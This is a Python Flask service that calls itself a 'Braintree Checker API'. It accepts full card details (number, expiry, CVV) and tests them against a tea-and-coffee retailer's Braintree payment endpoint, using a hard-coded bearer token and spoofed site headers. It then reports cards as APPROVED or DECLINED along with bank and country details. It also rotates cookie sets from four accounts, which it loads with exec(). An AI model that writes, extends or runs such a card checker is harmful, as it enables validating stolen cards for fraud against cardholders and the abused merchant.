from flask import Flask, jsonify, request
import requests
import re
import random
import time
import json
import glob
import os

app = Flask(__name__)

# Cookie Management System
SELECTED_COOKIE_PAIR = None

def discover_cookie_pairs():
    """Discover all available cookie pairs"""
    try:
        pairs = []
        # Tumhare 4 accounts ke liye
        for i in [1, 2, 3, 4]:
            file1 = f'cookies_{i}-1.txt'
            file2 = f'cookies_{i}-2.txt'
            
            if os.path.exists(file1) and os.path.exists(file2):
                pairs.append({
                    'id': str(i),
                    'file1': file1,
                    'file2': file2
                })
        return pairs
    except Exception as e:
        print(f"Cookie discovery error: {e}")
        return []

def select_random_cookie_pair():
    """Select random cookie pair from all 4 accounts"""
    global SELECTED_COOKIE_PAIR
    pairs = discover_cookie_pairs()
    if pairs:
        SELECTED_COOKIE_PAIR = random.choice(pairs)
    return SELECTED_COOKIE_PAIR

def read_cookies_from_file(filename):
    """Read cookies from file"""
    try:
        with open(filename, 'r') as f:
            content = f.read()
            namespace = {}
            exec(content, namespace)
            return namespace['cookies']
    except Exception as e:
        print(f"Error reading {filename}: {e}")
        return {}

# Braintree Headers
headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NjI0MTkwNzksImp0aSI6ImM0ODA2MTRkLTZhZGYtNDEzZS05ZjJiLWQ0YzcyMWQ1YmY4YSIsInN1YiI6IjM2NHpiN3dweWgzOTJkcXMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjM2NHpiN3dweWgzOTJkcXMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsicGF5cGFsX2NsaWVudF9pZCI6IkFid0oxWnptZVFtYlFFTlBHeURlcWNsQTc2OWNkcjZGbjlJLWYxTGZvYUkzek5HcVk2MEItWWc3V04tUlNPQXVUWHZIdnlPaFBwRHNkRzl6In19.aY0vsDVuHYvE5MA0UNOF_9ETu6MpQma8x3w7-gJMEtHU5g9NCq_Di6kZxmeAK6IziUeZfhcFIeW9Rm8PqnXq2Q',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://www.tea-and-coffee.com',
    'referer': 'https://www.tea-and-coffee.com/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
}

def get_bin_info(bin_number):
    """Get BIN information"""
    try:
        response = requests.get(f'https://api.voidex.dev/api/bin?bin={bin_number}', timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('brand', 'UNKNOWN'),
                'type': data.get('type', 'UNKNOWN'),
                'bank': data.get('bank', 'UNKNOWN'),
                'country': data.get('country_name', 'UNKNOWN'),
                'emoji': data.get('country_flag', '🏳️')
            }
    except:
        pass
    return {'brand': 'UNKNOWN', 'type': 'UNKNOWN', 'bank': 'UNKNOWN', 'country': 'UNKNOWN', 'emoji': '🏳️'}

def tokenize_card(cc, mm, yy, cvv):
    """Tokenize card via Braintree"""
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': f'session_{random.randint(10000, 99999)}'
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc.replace(" ", ""),
                    'expirationMonth': mm.zfill(2),
                    'expirationYear': yy if len(yy) == 4 else f'20{yy}',
                    'cvv': cvv,
                    'billingAddress': {'postalCode': '10080'}
                }
            }
        },
        'operationName': 'TokenizeCreditCard'
    }
    
    try:
        response = requests.post('https://payments.braintree-api.com/graphql', 
                               headers=headers, json=json_data, timeout=15)
        if response.status_code == 200:
            data = response.json()
            if 'data' in data and 'tokenizeCreditCard' in data['data']:
                return data['data']['tokenizeCreditCard']['token']
    except Exception as e:
        print(f"Tokenization error: {e}")
    return None

@app.route('/')
def home():
    return jsonify({"message": "Tea & Coffee Braintree Checker API", "status": "active"})

@app.route('/cc=<card_data>')
def check_card(card_data):
    start_time = time.time()
    
    try:
        # Parse card data
        parts = card_data.split('|')
        if len(parts) != 4:
            return jsonify({"error": "Invalid format. Use: /cc=number|mm|yy|cvv"})
        
        cc, mm, yy, cvv = parts
        
        # Select random cookie pair from all 4 accounts
        cookie_pair = select_random_cookie_pair()
        print(f"Using cookie pair: {cookie_pair['id']}")
        
        # Tokenize card
        token = tokenize_card(cc, mm, yy, cvv)
        if not token:
            return jsonify({"status": "DECLINED", "reason": "Tokenization Failed"})
        
        elapsed_time = time.time() - start_time
        bin_info = get_bin_info(cc[:6])
        
        response_data = {
            "status": "APPROVED",
            "card": f"{cc}|{mm}|{yy}|{cvv}",
            "token": token,
            "bin_info": bin_info,
            "cookie_pair": cookie_pair['id'],
            "gateway": "Braintree",
            "time_taken": f"{elapsed_time:.2f}s"
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({"error": str(e)})

if __name__ == '__main__':
    # Check if all cookie files exist
    pairs = discover_cookie_pairs()
    print(f"🔍 Found {len(pairs)} cookie pairs")
    
    for pair in pairs:
        print(f"✅ {pair['file1']} & {pair['file2']}")
    
    app.run(host='0.0.0.0', port=5000, debug=False)
